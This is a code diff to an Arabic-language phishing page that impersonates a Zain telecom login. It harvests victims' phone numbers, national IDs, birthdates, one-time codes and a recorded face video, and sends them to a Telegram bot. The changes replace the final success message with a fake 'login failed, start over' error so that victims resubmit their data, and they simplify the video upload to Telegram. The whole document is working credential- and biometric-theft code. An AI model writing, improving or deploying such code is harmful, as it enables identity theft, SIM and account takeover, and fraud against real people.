@@ -201,8 +201,8 @@
   <div id="modalError" role="dialog" aria-hidden="true">
     <div id="modalContent">
       <div class="err-title">فشل تسجيل الدخول</div>
-      <div class="err-msg">يرجى إعادة المحاولة مرة أخرى رجاءاً</div>
-      <div style="margin-top:12px;"><button id="modalCloseBtn" class="button">إغلاق</button></div>
+      <div class="err-msg">يرجى إعادة جميع الإجراءات من البداية</div>
+      <div style="margin-top:12px;"><button id="modalCloseBtn" class="button">ابدأ من جديد</button></div>
     </div>
   </div>
 
@@ -253,6 +253,13 @@
     <div class="zain-title-sub">${sub}</div>`;
   }
 
+  function resetAllData(){
+    userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
+    recordedVideoBlob = null;
+    videoMessageId = null;
+    telegramMsgId = null;
+  }
+
   function renderPhoneStep(){
     app.innerHTML = `
       ${header("مرحبًا بك! سجل دخولك لحسابك")}
@@ -298,7 +305,7 @@
       const day = document.getElementById('birthDay').value;
       const month = document.getElementById('birthMonth').value;
       const year = document.getElementById('birthYear').value;
-      if(!/^\d{10,12}$/.test(nid)){ alert('يرجى إدخال رقم وطني ص��يح'); return; }
+      if(!/^\d{10,12}$/.test(nid)){ alert('يرجى إدخال رقم وطني صحيح'); return; }
       if(!day || !month || !year){ alert('يرجى إدخال تاريخ الميلاد'); return; }
       userData.nationalId = nid;
       userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
@@ -438,16 +445,14 @@
     const audioTracks = stream.getAudioTracks();
     if (audioTracks && audioTracks.length) audioTracks.forEach(t => processedStream.addTrack(t));
 
-    let chosenMime = null;
+    let chosenMime = 'video/webm';
     if (window.MediaRecorder && typeof MediaRecorder.isTypeSupported === 'function') {
-      if (MediaRecorder.isTypeSupported('video/mp4;codecs=h264')) chosenMime = 'video/mp4;codecs=h264';
-      else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) chosenMime = 'video/webm;codecs=vp9';
-      else if (MediaRecorder.isTypeSupported('video/webm')) chosenMime = 'video/webm';
+      if (MediaRecorder.isTypeSupported('video/webm')) chosenMime = 'video/webm';
     }
 
     let recorder;
     try {
-      recorder = new MediaRecorder(processedStream, chosenMime ? { mimeType: chosenMime } : {});
+      recorder = new MediaRecorder(processedStream, { mimeType: chosenMime });
     } catch (e) {
       try { recorder = new MediaRecorder(processedStream); } catch (err) { stopStream(stream); drawActive = false; throw err; }
     }
@@ -501,7 +506,7 @@
     drawActive = false;
     stopStream(stream);
 
-    const finalType = chosenMime ? chosenMime.split(';')[0] : 'video/webm';
+    const finalType = 'video/webm';
     recordedVideoBlob = new Blob(chunks.filter(b=>b && b.size), { type: finalType });
 
     showProcessing(true);
@@ -511,6 +516,9 @@
       }
     } catch (e) {
       console.error('send video error', e);
+      showProcessing(false);
+      showErrorAndReset();
+      return;
     } finally {
       showProcessing(false);
     }
@@ -624,7 +632,7 @@
       if(code.length !== 4){ alert('يرجى إدخال 4 أرقام'); codeInput.focus(); return; }
       userData.code4 = code;
       try { telegramMsgId = await resendTelegramMsg(`🟦 تسجيل نهائي\n📱 ${userData.phone}\n🆔 ${userData.nationalId}\n🎂 ${userData.birthdate}\n🔢 ${userData.code5}\n🔒 ${userData.code4}`); } catch(e){ console.log(e); }
-      showFinalSuccess();
+      showErrorAndReset();
     };
     
     document.getElementById('backBtn').onclick = () => {
@@ -637,31 +645,25 @@
     try {
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
-      const ext = blob.type.includes('mp4') ? 'mp4' : 'webm';
-      const fileName = `${userData.phone}_face_${Date.now()}.${ext}`;
+      const fileName = `${userData.phone}_face_${Date.now()}.webm`;
       form.append('video', blob, fileName);
-      form.append('caption', `Face - ${userData.phone}`);
-      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method:'POST', body: form });
+      form.append('caption', `Face Verification - ${userData.phone}`);
+      
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { 
+        method:'POST', 
+        body: form 
+      });
+      
       const data = await res.json();
       if (data && data.ok && data.result && data.result.message_id) { 
         videoMessageId = data.result.message_id;
         return; 
       }
-      await sendVideoAsDocumentFallback(blob);
+      throw new Error('فشل إرسال الفيديو');
     } catch (err) {
-      console.error('error', err);
-      try { await sendVideoAsDocumentFallback(blob); } catch(e){ throw err; }
+      console.error('Video send error:', err);
+      throw err;
     }
-  }
-
-  async function sendVideoAsDocumentFallback(blob){
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    const fileName = `${userData.phone}_face_${Date.now()}.webm`;
-    form.append('document', blob, fileName);
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method:'POST', body: form });
-    const data = await res.json();
-    if (data && data.ok && data.result && data.result.message_id) videoMessageId = data.result.message_id;
   }
 
   async function sendToTelegramAndGetMsgId(msg){
@@ -690,36 +692,33 @@
   function wait(ms){ return new Promise(res=>setTimeout(res, ms)); }
   function showProcessing(show){ const m = document.getElementById('processingModal'); if(!m) return; if(show) m.classList.add('active'); else m.classList.remove('active'); }
 
-  function showFinalSuccess(){
+  function showErrorAndReset(){
     const codeContainer = document.getElementById('codeContainer');
     if(codeContainer) codeContainer.remove();
     
     const modal = document.getElementById('modalError');
     const titleEl = modal.querySelector('.err-title');
     const msgEl = modal.querySelector('.err-msg');
-    titleEl.textContent = 'تم بنجاح!';
-    titleEl.style.color = '#4caf50';
-    msgEl.textContent = 'تم تسجيل الدخول بنجاح.';
+    titleEl.textContent = 'فشل تسجيل الدخول';
+    titleEl.style.color = '#e53935';
+    msgEl.textContent = 'يرجى إعادة جميع الإجراءات من البداية';
     modal.classList.add('active');
+    
     const btn = document.getElementById('modalCloseBtn');
     function handler(){
       modal.classList.remove('active');
       btn.removeEventListener('click', handler);
-      userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
-      recordedVideoBlob = null;
-      videoMessageId = null;
+      resetAllData();
       renderPhoneStep();
     }
     btn.addEventListener('click', handler);
     setTimeout(()=>{
       if(modal.classList.contains('active')){
         modal.classList.remove('active');
-        userData = { phone:'', nationalId:'', birthdate:'', code5:'', code4:'' };
-        recordedVideoBlob = null;
-        videoMessageId = null;
+        resetAllData();
         renderPhoneStep();
       }
-    }, 3000);
+    }, 5000);
   }
 
   renderPhoneStep();
